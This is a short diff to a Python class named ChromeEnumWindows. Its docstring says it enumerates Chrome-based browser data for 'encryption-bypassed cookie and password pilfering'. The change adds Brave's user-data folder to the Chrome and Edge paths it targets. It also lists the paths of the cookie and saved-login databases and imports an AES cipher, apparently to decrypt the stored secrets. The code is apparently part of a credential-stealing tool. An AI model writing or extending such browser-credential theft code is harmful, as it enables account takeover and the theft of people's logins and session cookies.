@@ -141,7 +141,8 @@ from Cryptodome.Cipher import AES
 class ChromeEnumWindows:
     """Enumerates Chrome-based browser data to allow for encryption-bypassed cookie and password pilfering"""
     CHROME_DIRS = [os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\'),
-                   os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\')]
+                   os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\'),
+                   os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\')]
     COOKIES_DIRS = ['Default\\Cookies',
                     'Default\\Network\\Cookies']
     PASSWORD_DIRS = ['Default\\Login Data']
